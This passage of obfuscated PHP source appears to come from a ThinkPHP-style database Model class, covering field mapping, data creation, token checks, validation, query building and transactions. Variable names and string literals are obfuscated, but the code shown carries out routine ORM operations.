returnResult($•ùâˆ²Î, $›â©àì’ = '') { $êÇÈ’Ï™ =& $_SERVER[§Êá¸İ]; if ($›â©àì’) { if (is_callable($›â©àì’)) { return call_user_func($›â©àì’, $•ùâˆ²Î); } switch (strtolower($›â©àì’)) { case $êÇÈ’Ï™[370]: return json_encode($•ùâˆ²Î); case $êÇÈ’Ï™[371]: return xml_encode($•ùâˆ²Î); } } return $•ùâˆ²Î; } public function parseFieldsMap($¸óÓÇÎ, $§°¬ÉÎ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ªŸÕ†” => $¡øËûğ¿) { if ($§°¬ÉÎ == 1) { if (isset($¸óÓÇÎ[$¡øËûğ¿])) { $¸óÓÇÎ[$ªŸÕ†”] = $¸óÓÇÎ[$¡øËûğ¿]; unset($¸óÓÇÎ[$¡øËûğ¿]); } } else { if (isset($¸óÓÇÎ[$ªŸÕ†”])) { $¸óÓÇÎ[$¡øËûğ¿] = $¸óÓÇÎ[$ªŸÕ†”]; unset($¸óÓÇÎ[$ªŸÕ†”]); } } } } return $¸óÓÇÎ; } public function setField($«ğæËŠ¸, $¸›İôÈ­ = '') { if (is_array($«ğæËŠ¸)) { $ò×´æÑà = $«ğæËŠ¸; } else { $ò×´æÑà[$«ğæËŠ¸] = $¸›İôÈ­; } return $this->save($ò×´æÑà); } public function setAdd($¯•§­ë¢, $ûİ ŸĞÙ = 1) { $„ó…²«‰ =& $_SERVER[§Êá¸İ]; $à±´¨¼ = $¯•§­ë¢ . $„ó…²«‰[372] . $ûİ ŸĞÙ; if ($ûİ ŸĞÙ < 0) { $à±´¨¼ = $¯•§­ë¢ . $ûİ ŸĞÙ; } return $this->setField($¯•§­ë¢, array($„ó…²«‰[373], $à±´¨¼)); } public function getField($ÇŞ€ÍÛ¸, $Ó™¤À¶® = null) { $ÚŞ˜ìÌ£ =& $_SERVER[§Êá¸İ]; $èŞ„Ùˆò[$ÚŞ˜ìÌ£[350]] = $ÇŞ€ÍÛ¸; $èŞ„Ùˆò = $this->_parseOptions($èŞ„Ùˆò); $ÇŞ€ÍÛ¸ = trim($ÇŞ€ÍÛ¸); if (strpos($ÇŞ€ÍÛ¸, $ÚŞ˜ìÌ£[50])) { if (!isset($èŞ„Ùˆò[$ÚŞ˜ìÌ£[368]])) { $èŞ„Ùˆò[$ÚŞ˜ìÌ£[368]] = is_numeric($Ó™¤À¶®) ? $Ó™¤À¶® : $ÚŞ˜ìÌ£[12]; } $èÇ¸Çàâ = $this->db->select($èŞ„Ùˆò); if (!empty($èÇ¸Çàâ)) { $‡Ñ¡ğò‰ = explode($ÚŞ˜ìÌ£[50], $ÇŞ€ÍÛ¸); $ÇŞ€ÍÛ¸ = array_keys($èÇ¸Çàâ[0]); $¬ØÀÙü = array_shift($ÇŞ€ÍÛ¸); $İ¶ŠËôã = array_shift($ÇŞ€ÍÛ¸); $ÄØí˜İ = array(); $áÃ‘Ùî = count($‡Ñ¡ğò‰); foreach ($èÇ¸Çàâ as $´îÅãúø) { $É¯ò»ŒÌ = $´îÅãúø[$¬ØÀÙü]; if (2 == $áÃ‘Ùî) { $ÄØí˜İ[$É¯ò»ŒÌ] = $´îÅãúø[$İ¶ŠËôã]; } else { $ÄØí˜İ[$É¯ò»ŒÌ] = is_string($Ó™¤À¶®) ? implode($Ó™¤À¶®, $´îÅãúø) : $´îÅãúø; } } return $ÄØí˜İ; } } else { if (!0 !== $Ó™¤À¶®) { $èŞ„Ùˆò[$ÚŞ˜ìÌ£[368]] = is_numeric($Ó™¤À¶®) ? $Ó™¤À¶® : 1; } if ($Ó™¤À¶® === $ÚŞ˜ìÌ£[332]) { unset($èŞ„Ùˆò[$ÚŞ˜ìÌ£[368]]); } $´îÅãúø = $this->db->select($èŞ„Ùˆò); if (!empty($´îÅãúø)) { if ($Ó™¤À¶® === $ÚŞ˜ìÌ£[332]) { return reset($´îÅãúø[0]); } if (!0 !== $Ó™¤À¶® && 1 == $èŞ„Ùˆò[$ÚŞ˜ìÌ£[368]]) { return reset($´îÅãúø[0]); } foreach ($´îÅãúø as $–ªÖû¢º) { $éØ‚€’ì[] = $–ªÖû¢º[$ÇŞ€ÍÛ¸]; } return $éØ‚€’ì; } } return null; } public function create($’ÅÃ‡³ = '', $¥±œ’Ãñ = '') { $Ş‘–Éğ =& $_SERVER[§Êá¸İ]; if (empty($’ÅÃ‡³)) { $’ÅÃ‡³ = $_POST; } elseif (is_object($’ÅÃ‡³)) { $’ÅÃ‡³ = get_object_vars($’ÅÃ‡³); } if (empty($’ÅÃ‡³) || !is_array($’ÅÃ‡³)) { $this->error = think_lang($Ş‘–Éğ[348]); return !1; } $’ÅÃ‡³ = $this->parseFieldsMap($’ÅÃ‡³, 0); $¥±œ’Ãñ = $¥±œ’Ãñ ? $¥±œ’Ãñ : (!empty($’ÅÃ‡³[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ş‘–Éğ[350]])) { $ìØ’‹ÜŞ = $this->options[$Ş‘–Éğ[350]]; unset($this->options[$Ş‘–Éğ[350]]); } elseif ($¥±œ’Ãñ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ìØ’‹ÜŞ = $this->insertFields; } elseif ($¥±œ’Ãñ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ìØ’‹ÜŞ = $this->updateFields; } if (isset($ìØ’‹ÜŞ)) { if (is_string($ìØ’‹ÜŞ)) { $ìØ’‹ÜŞ = explode($Ş‘–Éğ[50], $ìØ’‹ÜŞ); } if (think_config($Ş‘–Éğ[374])) { $ìØ’‹ÜŞ[] = think_config($Ş‘–Éğ[375]); } foreach ($’ÅÃ‡³ as $Ååº»Î– => $â²¹íúÊ) { if (!in_array($Ååº»Î–, $ìØ’‹ÜŞ)) { unset($’ÅÃ‡³[$Ååº»Î–]); } } } if (!$this->autoValidation($’ÅÃ‡³, $¥±œ’Ãñ)) { return !1; } if (!$this->autoCheckToken($’ÅÃ‡³)) { $this->error = think_lang($Ş‘–Éğ[376]); return !1; } if ($this->autoCheckFields) { $ìØ’‹ÜŞ = $this->getDbFields(); foreach ($’ÅÃ‡³ as $Ååº»Î– => $â²¹íúÊ) { if (!in_array($Ååº»Î–, $ìØ’‹ÜŞ)) { unset($’ÅÃ‡³[$Ååº»Î–]); } elseif (MAGIC_QUOTES_GPC && is_string($â²¹íúÊ)) { $’ÅÃ‡³[$Ååº»Î–] = stripslashes($â²¹íúÊ); } } } $this->autoOperation($’ÅÃ‡³, $¥±œ’Ãñ); $this->data = $’ÅÃ‡³; return $’ÅÃ‡³; } public function autoCheckToken($Úíş“Ãõ) { $åĞ­¿Â =& $_SERVER[§Êá¸İ]; if (isset($this->options[$åĞ­¿Â[377]]) && !$this->options[$åĞ­¿Â[377]]) { return !0; } if (think_config($åĞ­¿Â[374])) { $€ÉÉâÔÜ = think_config($åĞ­¿Â[375]); if (!isset($Úíş“Ãõ[$€ÉÉâÔÜ]) || Session::get($€ÉÉâÔÜ)) { return !1; } list($ñôÚ‚æ, $ÆÒ˜¡Û) = explode($åĞ­¿Â[11], $Úíş“Ãõ[$€ÉÉâÔÜ]); if ($ÆÒ˜¡Û && Session::get($€ÉÉâÔÜ . $åĞ­¿Â[10] . $ñôÚ‚æ) === $ÆÒ˜¡Û) { Session::remove($€ÉÉâÔÜ . $åĞ­¿Â[10] . $ñôÚ‚æ); return !0; } if (think_config($åĞ­¿Â[378])) { Session::remove($€ÉÉâÔÜ . $åĞ­¿Â[10] . $ñôÚ‚æ); } return !1; } return !0; } public function regex($Ò²…Å›Ğ, $ŸÒñ»ì€) { $—‡­´İ‡ =& $_SERVER[§Êá¸İ]; $ÄÔ¹é = array($—‡­´İ‡[379] => $—‡­´İ‡[380], $—‡­´İ‡[381] => $—‡­´İ‡[382], $—‡­´İ‡[383] => $—‡­´İ‡[384], $—‡­´İ‡[385] => $—‡­´İ‡[386], $—‡­´İ‡[387] => $—‡­´İ‡[388], $—‡­´İ‡[389] => $—‡­´İ‡[390], $—‡­´İ‡[391] => $—‡­´İ‡[392], $—‡­´İ‡[366] => $—‡­´İ‡[393], $—‡­´İ‡[394] => $—‡­´İ‡[395]); if (isset($ÄÔ¹é[strtolower($ŸÒñ»ì€)])) { $ŸÒñ»ì€ = $ÄÔ¹é[strtolower($ŸÒñ»ì€)]; } return preg_match($ŸÒñ»ì€, $Ò²…Å›Ğ) === 1; } private function autoOperation(&$Ñ’›Ø», $ÈÜ²Û¼ì) { $Ó¡ÜñŠƒ =& $_SERVER[§Êá¸İ]; if (!empty($this->options[$Ó¡ÜñŠƒ[396]])) { $íº¥ôº = $this->options[$Ó¡ÜñŠƒ[396]]; unset($this->options[$Ó¡ÜñŠƒ[396]]); } elseif (!empty($this->_auto)) { $íº¥ôº = $this->_auto; } if (isset($íº¥ôº)) { foreach ($íº¥ôº as $µ¿œÖÎ“) { if (empty($µ¿œÖÎ“[2])) { $µ¿œÖÎ“[2] = THINK_MODEL_INSERT; } if ($ÈÜ²Û¼ì == $µ¿œÖÎ“[2] || $µ¿œÖÎ“[2] == THINK_MODEL_BOTH) { switch (trim($µ¿œÖÎ“[3])) { case $Ó¡ÜñŠƒ[397]: case $Ó¡ÜñŠƒ[398]: $Ô¸ù‰»¬ = isset($µ¿œÖÎ“[4]) ? (array) $µ¿œÖÎ“[4] : array(); if (isset($Ñ’›Ø»[$µ¿œÖÎ“[0]])) { array_unshift($Ô¸ù‰»¬, $Ñ’›Ø»[$µ¿œÖÎ“[0]]); } if ($Ó¡ÜñŠƒ[397] == $µ¿œÖÎ“[3]) { $Ñ’›Ø»[$µ¿œÖÎ“[0]] = call_user_func_array($µ¿œÖÎ“[1], $Ô¸ù‰»¬); } else { $Ñ’›Ø»[$µ¿œÖÎ“[0]] = call_user_func_array(array(&$this, $µ¿œÖÎ“[1]), $Ô¸ù‰»¬); } break; case $Ó¡ÜñŠƒ[350]: $Ñ’›Ø»[$µ¿œÖÎ“[0]] = $Ñ’›Ø»[$µ¿œÖÎ“[1]]; break; case $Ó¡ÜñŠƒ[399]: if ($Ó¡ÜñŠƒ[12] === $Ñ’›Ø»[$µ¿œÖÎ“[0]]) { unset($Ñ’›Ø»[$µ¿œÖÎ“[0]]); } break; case $Ó¡ÜñŠƒ[400]: default: $Ñ’›Ø»[$µ¿œÖÎ“[0]] = $µ¿œÖÎ“[1]; } if (!1 === $Ñ’›Ø»[$µ¿œÖÎ“[0]]) { unset($Ñ’›Ø»[$µ¿œÖÎ“[0]]); } } } } return $Ñ’›Ø»; } protected function autoValidation($ÈŸ§Õ•, $ÚÄÍä½™) { $°“‹è‘á =& $_SERVER[§Êá¸İ]; if (!empty($this->options[$°“‹è‘á[401]])) { $ô– íĞÉ = $this->options[$°“‹è‘á[401]]; unset($this->options[$°“‹è‘á[401]]); } elseif (!empty($this->_validate)) { $ô– íĞÉ = $this->_validate; } if (isset($ô– íĞÉ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ô– íĞÉ as $¡–ö­Ÿ¬ => $Ç–¦òü) { if (empty($Ç–¦òü[5]) || $Ç–¦òü[5] == THINK_MODEL_BOTH || $Ç–¦òü[5] == $ÚÄÍä½™) { if (0 == strpos($Ç–¦òü[2], $°“‹è‘á[402]) && strpos($Ç–¦òü[2], $°“‹è‘á[403])) { $Ç–¦òü[2] = think_lang(substr($Ç–¦òü[2], 2, -1)); } $Ç–¦òü[3] = isset($Ç–¦òü[3]) ? $Ç–¦òü[3] : THINK_EXISTS_VALIDATE; $Ç–¦òü[4] = isset($Ç–¦òü[4]) ? $Ç–¦òü[4] : $°“‹è‘á[404]; switch ($Ç–¦òü[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÈŸ§Õ•, $Ç–¦òü)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($°“‹è‘á[12] != trim($ÈŸ§Õ•[$Ç–¦òü[0]])) { if (!1 === $this->_validationField($ÈŸ§Õ•, $Ç–¦òü)) { return !1; } } break; default: if (isset($ÈŸ§Õ•[$Ç–¦òü[0]])) { if (!1 === $this->_validationField($ÈŸ§Õ•, $Ç–¦òü)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($òàÂº–¯, $¨„Ò£ˆÚ) { if (!1 === $this->_validationFieldItem($òàÂº–¯, $¨„Ò£ˆÚ)) { if ($this->patchValidate) { $this->error[$¨„Ò£ˆÚ[0]] = $¨„Ò£ˆÚ[2]; } else { $this->error = $¨„Ò£ˆÚ[2]; return !1; } } return; } protected function _validationFieldItem($¹Í‚†¥ˆ, $”æ’˜•) { $ŸºíÊ¼á =& $_SERVER[§Êá¸İ]; switch (strtolower(trim($”æ’˜•[4]))) { case $ŸºíÊ¼á[397]: case $ŸºíÊ¼á[398]: $Ùö£«ú = isset($”æ’˜•[6]) ? (array) $”æ’˜•[6] : array(); if (is_string($”æ’˜•[0]) && strpos($”æ’˜•[0], $ŸºíÊ¼á[50])) { $”æ’˜•[0] = explode($ŸºíÊ¼á[50], $”æ’˜•[0]); } if (is_array($”æ’˜•[0])) { foreach ($”æ’˜•[0] as $Ø¡ı›) { $“•”›Á´[$Ø¡ı›] = $¹Í‚†¥ˆ[$Ø¡ı›]; } array_unshift($Ùö£«ú, $“•”›Á´); } else { array_unshift($Ùö£«ú, $¹Í‚†¥ˆ[$”æ’˜•[0]]); } if ($ŸºíÊ¼á[397] == $”æ’˜•[4]) { return call_user_func_array($”æ’˜•[1], $Ùö£«ú); } else { return call_user_func_array(array(&$this, $”æ’˜•[1]), $Ùö£«ú); } case $ŸºíÊ¼á[405]: return $¹Í‚†¥ˆ[$”æ’˜•[0]] == $¹Í‚†¥ˆ[$”æ’˜•[1]]; case $ŸºíÊ¼á[406]: if (is_string($”æ’˜•[0]) && strpos($”æ’˜•[0], $ŸºíÊ¼á[50])) { $”æ’˜•[0] = explode($ŸºíÊ¼á[50], $”æ’˜•[0]); } $Âª’Ìµ‹ = array(); if (is_array($”æ’˜•[0])) { foreach ($”æ’˜•[0] as $Ø¡ı›) { $Âª’Ìµ‹[$Ø¡ı›] = $¹Í‚†¥ˆ[$Ø¡ı›]; } } else { $Âª’Ìµ‹[$”æ’˜•[0]] = $¹Í‚†¥ˆ[$”æ’˜•[0]]; } if (!empty($¹Í‚†¥ˆ[$this->getPk()])) { $Âª’Ìµ‹[$this->getPk()] = array($ŸºíÊ¼á[407], $¹Í‚†¥ˆ[$this->getPk()]); } if ($this->where($Âª’Ìµ‹)->find()) { return !1; } return !0; default: return $this->check($¹Í‚†¥ˆ[$”æ’˜•[0]], $”æ’˜•[1], $”æ’˜•[4]); } } public function check($ È´ô¾‰, $ÒÒ±­¿®, $•Å¹òàù = "\162\145\x67\x65\170") { $á‘ÅøÍî =& $_SERVER[§Êá¸İ]; $•Å¹òàù = strtolower(trim($•Å¹òàù)); switch ($•Å¹òàù) { case $á‘ÅøÍî[7]: case $á‘ÅøÍî[408]: $¨é„Âî„ = is_array($ÒÒ±­¿®) ? $ÒÒ±­¿® : explode($á‘ÅøÍî[50], $ÒÒ±­¿®); return $•Å¹òàù == $á‘ÅøÍî[7] ? in_array($ È´ô¾‰, $¨é„Âî„) : !in_array($ È´ô¾‰, $¨é„Âî„); case $á‘ÅøÍî[409]: case $á‘ÅøÍî[410]: if (is_array($ÒÒ±­¿®)) { $¾ôáøÍå = $ÒÒ±­¿®[0]; $äó¦ıÔ¸ = $ÒÒ±­¿®[1]; } else { list($¾ôáøÍå, $äó¦ıÔ¸) = explode($á‘ÅøÍî[50], $ÒÒ±­¿®); } return $•Å¹òàù == $á‘ÅøÍî[409] ? $ È´ô¾‰ >= $¾ôáøÍå && $ È´ô¾‰ <= $äó¦ıÔ¸ : $ È´ô¾‰ < $¾ôáøÍå || $ È´ô¾‰ > $äó¦ıÔ¸; case $á‘ÅøÍî[411]: case $á‘ÅøÍî[412]: return $•Å¹òàù == $á‘ÅøÍî[411] ? $ È´ô¾‰ == $ÒÒ±­¿® : $ È´ô¾‰ != $ÒÒ±­¿®; case $á‘ÅøÍî[413]: $„Ç¥×…º = mb_strlen($ È´ô¾‰, $á‘ÅøÍî[414]); if (strpos($ÒÒ±­¿®, $á‘ÅøÍî[50])) { list($¾ôáøÍå, $äó¦ıÔ¸) = explode($á‘ÅøÍî[50], $ÒÒ±­¿®); return $„Ç¥×…º >= $¾ôáøÍå && $„Ç¥×…º <= $äó¦ıÔ¸; } else { return $„Ç¥×…º == $ÒÒ±­¿®; } case $á‘ÅøÍî[415]: list($îü¤¦±ß, $—÷£ˆŞŒ) = explode($á‘ÅøÍî[50], $ÒÒ±­¿®); if (!is_numeric($îü¤¦±ß)) { $îü¤¦±ß = strtotime($îü¤¦±ß); } if (!is_numeric($—÷£ˆŞŒ)) { $—÷£ˆŞŒ = strtotime($—÷£ˆŞŒ); } return NOW_TIME >= $îü¤¦±ß && NOW_TIME <= $—÷£ˆŞŒ; case $á‘ÅøÍî[416]: return in_array(get_client_ip(), explode($á‘ÅøÍî[50], $ÒÒ±­¿®)); case $á‘ÅøÍî[417]: return !in_array(get_client_ip(), explode($á‘ÅøÍî[50], $ÒÒ±­¿®)); case $á‘ÅøÍî[404]: default: return $this->regex($ È´ô¾‰, $ÒÒ±­¿®); } } public function query($ÁŒœ‰º®, $˜Çò¹× = false) { $ÊŞÄÙÜ“ =& $_SERVER[§Êá¸İ]; if (!is_bool($˜Çò¹×) && !is_array($˜Çò¹×)) { $˜Çò¹× = func_get_args(); array_shift($˜Çò¹×); } $ÁŒœ‰º® = str_replace(array($ÊŞÄÙÜ“[262], $ÊŞÄÙÜ“[418]), $ÊŞÄÙÜ“[53], $ÁŒœ‰º®); $ÁŒœ‰º® = $this->parseSql($ÁŒœ‰º®, $˜Çò¹×); return $this->db->query($ÁŒœ‰º®); } public function execute($–ìÈ‰á, $²ñê—º· = false) { if (!is_bool($²ñê—º·) && !is_array($²ñê—º·)) { $²ñê—º· = func_get_args(); array_shift($²ñê—º·); } $–ìÈ‰á = $this->parseSql($–ìÈ‰á, $²ñê—º·); return $this->db->execute($–ìÈ‰á); } protected function parseSql($ÀÕïœ…Ş, $›°ı´ôÀ) { $¢ÈäĞñ– =& $_SERVER[§Êá¸İ]; if (!0 === $›°ı´ôÀ) { $ïıİëàÜ = $this->_parseOptions(); $ÀÕïœ…Ş = $this->db->parseSql($ÀÕïœ…Ş, $ïıİëàÜ); } elseif (is_array($›°ı´ôÀ)) { $›°ı´ôÀ = array_map(array($this->db, $¢ÈäĞñ–[419]), $›°ı´ôÀ); $ÀÕïœ…Ş = vsprintf($ÀÕïœ…Ş, $›°ı´ôÀ); } else { $ÀÕïœ…Ş = strtr($ÀÕïœ…Ş, array($¢ÈäĞñ–[420] => $this->getTableName(), $¢ÈäĞñ–[421] => think_config($¢ÈäĞñ–[321]))); } $this->db->setModel($this->name); return $ÀÕïœ…Ş; } public function db($Ã“Èü³ç = '', $‹…Œ˜ = '', $ú®¦ëîš = array()) { $«’Ü‹şÆ =& $_SERVER[§Êá¸İ]; if ($«’Ü‹şÆ[12] === $Ã“Èü³ç && $this->db) { return $this->db; } static $Ó—Èß— = array(); static $şš©è” = array(); if (!isset($şš©è”[$Ã“Èü³ç]) || isset($şš©è”[$Ã“Èü³ç]) && $‹…Œ˜ && $Ó—Èß—[$Ã“Èü³ç] != $‹…Œ˜) { if (!empty($‹…Œ˜) && is_string($‹…Œ˜) && !1 === strpos($‹…Œ˜, $«’Ü‹şÆ[8])) { $‹…Œ˜ = think_config($‹…Œ˜); } $Ã“Èü³ç = think_guid($‹…Œ˜); $şš©è”[$Ã“Èü³ç] = Db::getInstance($‹…Œ˜); } elseif (NULL === $‹…Œ˜) { $şš©è”[$Ã“Èü³ç]->close(); unset($şš©è”[$Ã“Èü³ç]); return; } if (!empty($ú®¦ëîš)) { if (is_string($ú®¦ëîš)) { parse_str($ú®¦ëîš, $ú®¦ëîš); } foreach ($ú®¦ëîš as $ö©ÕûıÊ => $ÁÂ¤¡å´) { $this->setProperty($ö©ÕûıÊ, $ÁÂ¤¡å´); } } $Ó—Èß—[$Ã“Èü³ç] = $‹…Œ˜; $this->db = $şš©è”[$Ã“Èü³ç]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¢ºíë‰ = get_class($this); if ($¢ºíë‰ == $_SERVER[§Êá¸İ][422]) { return $this->name; } $this->name = substr($¢ºíë‰, 0, -5); } return $this->name; } public function getTableName() { $°ßı† =& $_SERVER[§Êá¸İ]; if (empty($this->trueTableName)) { $ñ¢Ï€ú = !empty($this->tablePrefix) ? $this->tablePrefix : $°ßı†[12]; if (!empty($this->tableName)) { $ñ¢Ï€ú .= $this->tableName; } else { $ñ¢Ï€ú .= think_parse_name($this->name); } $this->trueTableName = strtolower($ñ¢Ï€ú); } return (!empty($this->dbName) ? $this->dbName . $°ßı†[10] : $°ßı†[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¦¯»’Œ• =& $_SERVER[§Êá¸İ]; return isset($this->fields[$¦¯»’Œ•[328]]) ? $this->fields[$¦¯»’Œ•[328]] : $this->pk; } public function getDbFields() { $îİ—¹Ë =& $_SERVER[§Êá¸İ]; if (isset($this->options[$îİ—¹Ë[356]])) { $Ÿâõ½ñí = $this->db->getFields($this->options[$îİ—¹Ë[356]]); return $Ÿâõ½ñí ? array_keys($Ÿâõ½ñí) : !1; } if ($this->fields) { $Ÿâõ½ñí = $this->fields; unset($Ÿâõ½ñí[$îİ—¹Ë[327]], $Ÿâõ½ñí[$îİ—¹Ë[328]], $Ÿâõ½ñí[$îİ—¹Ë[329]], $Ÿâõ½ñí[$îİ—¹Ë[326]]); return $Ÿâõ½ñí; } return !1; } public function data($©û§Ùî§ = '') { $µ‘Æê­ =& $_SERVER[§Êá¸İ]; if ($µ‘Æê­[12] === $©û§Ùî§ && !empty($this->data)) { return $this->data; } if (is_object($©û§Ùî§)) { $©û§Ùî§ = get_object_vars($©û§Ùî§); } elseif (is_string($©û§Ùî§)) { parse_str($©û§Ùî§, $©û§Ùî§); } elseif (!is_array($©û§Ùî§)) { think_exception(think_lang($µ‘Æê­[348])); } $this->data = $©û§Ùî§; return $this; } public function join($ıÅ—è¬‚) { $ãñÏ­ =& $_SERVER[§Êá¸İ]; if (is_array($ıÅ—è¬‚)) { $this->options[$ãñÏ­[359]] = $ıÅ—è¬‚; } elseif (!empty($ıÅ—è¬‚)) { $this->options[$ãñÏ­[359]][] = $ıÅ—è¬‚; } return $this; } public function union($Ú‘¤Ù¢, $ÑÜ©ú³ = false) { $¸å‡ÏË² =& $_SERVER[§Êá¸İ]; if (empty($Ú‘¤Ù¢)) { return $this; } if ($ÑÜ©ú³) { $this->options[$¸å‡ÏË²[423]][$¸å‡ÏË²[424]] = !0; } if (is_object($Ú‘¤Ù¢)) { $Ú‘¤Ù¢ = get_object_vars($Ú‘¤Ù¢); } if (is_string($Ú‘¤Ù¢)) { $İÑå´ÓØ = $Ú‘¤Ù¢; } elseif (is_array($Ú‘¤Ù¢)) { if (isset($Ú‘¤Ù¢[0])) { $this->options[$¸å‡ÏË²[423]] = array_merge($this->options[$¸å‡ÏË²[423]], $Ú‘¤Ù¢); return $this; } else { $İÑå´ÓØ = $Ú‘¤Ù¢; } } else { think_exception(think_lang($¸å‡ÏË²[348])); } $this->options[$¸å‡ÏË²[423]][] = $İÑå´ÓØ; return $this; } public function cache($‡¹öÙ‰Ô = true, $û³»éåŸ = null, $ŒîÆÏ•ı = '') { $Ğ³¯¬ÀÃ =& $_SERVER[§Êá¸İ]; if (!1 !== $‡¹öÙ‰Ô) { $this->options[$Ğ³¯¬ÀÃ[425]] = array($Ğ³¯¬ÀÃ[97] => $‡¹öÙ‰Ô, $Ğ³¯¬ÀÃ[415] => $û³»éåŸ, $Ğ³¯¬ÀÃ[33] => $ŒîÆÏ•ı); } return $this; } public function field($œÛçñÍ², $ïÊğ¯Ä¬ = false) { $ŒÛˆÑ¯ =& $_SERVER[§Êá¸İ]; if (!0 === $œÛçñÍ²) { $á±²ÅİÀ = $this->getDbFields(); $œÛçñÍ² = $á±²ÅİÀ ? $á±²ÅİÀ : $ŒÛˆÑ¯[220]; } elseif ($ïÊğ¯Ä¬) { if (is_string($œÛçñÍ²)) { $œÛçñÍ² = explode($ŒÛˆÑ¯[50], $œÛçñÍ²); } $á±²ÅİÀ = $this->getDbFields(); $œÛçñÍ² = $á±²ÅİÀ ? array_diff($á±²ÅİÀ, $œÛçñÍ²) : $œÛçñÍ²; } $this->options[$ŒÛˆÑ¯[350]] = $œÛçñÍ²; return $this; } public function scope($ïçò€¾ = '', $˜´À¥‹í = NULL) { $­ªÛö½« =& $_SERVER[§Êá¸İ]; if ($­ªÛö½«[12] === $ïçò€¾) { if (isset($this->_scope[$­ªÛö½«[37]])) { $ÙµÂÆ•ê = $this->_scope[$­ªÛö½«[37]]; } else { return $this; } } elseif (is_string($ïçò€¾)) { $Î·ŠëÎ¨ = explode($­ªÛö½«[50], $ïçò€¾); $ÙµÂÆ•ê = array(); foreach ($Î·ŠëÎ¨ as $“ÈÀĞ¨ş) { if (!isset($this->_scope[$“ÈÀĞ¨ş])) { continue; } $ÙµÂÆ•ê = array_merge($ÙµÂÆ•ê, $this->_scope[$“ÈÀĞ¨ş]); } if (!empty($˜´À¥‹í) && is_array($˜´À¥‹í)) { $ÙµÂÆ•ê = array_merge($ÙµÂÆ•ê, $˜´À¥‹í); } } elseif (is_array($ïçò€¾)) { $ÙµÂÆ•ê = $ïçò€¾; } if (is_array($ÙµÂÆ•ê) && !empty($ÙµÂÆ•ê)) { $this->options = array_merge($this->options, array_change_key_case($ÙµÂÆ•ê)); } return $this; } public function where($äñ“É–, $Ğ†·‡øÔ = null) { $êš•Øßµ =& $_SERVER[§Êá¸İ]; if (!is_null($Ğ†·‡øÔ) && is_string($äñ“É–)) { if (!is_array($Ğ†·‡øÔ)) { $Ğ†·‡øÔ = func_get_args(); array_shift($Ğ†·‡øÔ); } $Ğ†·‡øÔ = array_map(array($this->db, $êš•Øßµ[419]), $Ğ†·‡øÔ); $äñ“É– = vsprintf($äñ“É–, $Ğ†·‡øÔ); } elseif (is_object($äñ“É–)) { $äñ“É– = get_object_vars($äñ“É–); } elseif (is_array($äñ“É–)) { foreach ($äñ“É– as $ñïÑì°÷ => $ï´è«ø) { if ((is_numeric($ñïÑì°÷) || !$ñïÑì°÷) && is_string($ï´è«ø)) { if (strpos($ï´è«ø, $êš•Øßµ[426]) === 0) { continue; } think_trace($êš•Øßµ[427], $êš•Øßµ[12], $êš•Øßµ[49]); die; } } } if (is_string($äñ“É–) && $êš•Øßµ[12] != $äñ“É–) { $Á¦ş‘Ûâ = array(); $Á¦ş‘Ûâ[$êš•Øßµ[428]] = $äñ“É–; $äñ“É– = $Á¦ş‘Ûâ; } if (isset($this->options[$êš•Øßµ[352]])) { $this->options[$êš•Øßµ[352]] = array_merge($this->options[$êš•Øßµ[352]], $äñ“É–); } else { $this->options[$êš•Øßµ[352]] = $äñ“É–; } return $this; } public function limit($ºşØ²‡¬, $È¶üšÇ = null) { $˜ÕÜîïÖ =& $_SERVER[§Êá¸İ]; $this->options[$˜ÕÜîïÖ[368]] = is_null($È¶üšÇ) ? $ºşØ²‡¬ : $ºşØ²‡¬ . $˜ÕÜîïÖ[50] . $È¶üšÇ; return $this; } public function page($íü’èÀË, $õ±Üó¾Æ = null) { $Ñ‘çó†î =& $_SERVER[§Êá¸İ]; $this->options[$Ñ‘çó†î[429]] = is_null($õ±Üó¾Æ) ? $íü’èÀË : $íü’èÀË . $Ñ‘çó†î[50] . $õ±Üó¾Æ; return $this; } public function comment($û¾âØ·) { $this->options[$_SERVER[§Êá¸İ][430]] = $û¾âØ·; return $this; } public function setProperty($¯³ı‚Ê, $Ë³äœŒö) { if (property_exists($this, $¯³ı‚Ê)) { $this->{$¯³ı‚Ê} = $Ë³äœŒö; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\124\151\x6d\x65", "\164\151\155\x65", "\x69\156\163\x65\x72\x74\x2c\x75\160\x64\x61\x74\x65", "\x66\x75\x6e\x63\x74\151\x6f\x6e"), array("\143\162\x65\141\164\x65\x54\x69\x6d\145", "\x74\151\x6d\x65", "\x69\156\163\145\162\164", "\146\165\x6e\x63\x74\151\x6f\x6e")); public function setDataAuto($ã¿¾ı²˜) { $this->dataAuto = $ã¿¾ı²˜; } public function __construct($ïòˆØ± = '', $ÑñÊ = '', $¡½÷ú»É = '') { parent::__construct($ïòˆØ±, $ÑñÊ, $¡½÷ú»É); } protected $tableMeta = array(); protected function _beforeInsert(&$¾•¢€ªá, $ßé¸Ê) { $­Ãä¸…ƒ =& $_SERVER[§Êá¸İ]; if (!$this->checkDataAutoHas($­Ãä¸…ƒ[431])) { return; } $this->dataBeforeFilter($¾•¢€ªá, $­Ãä¸…ƒ[431]); } protected function _beforeUpdate(&$™Çº¬¥ë, $Í‰õˆª§) { $«ôéïÛ¢ =& $_SERVER[§Êá¸İ]; if (!$this->checkDataAutoHas($«ôéïÛ¢[432])) { return; } $this->dataBeforeFilter($™Çº¬¥ë, $«ôéïÛ¢[432]); } protected function _afterSelect(&$Ïï„³®Î, $Äàı®òå) { if (!is_array($Ïï„³®Î)) { 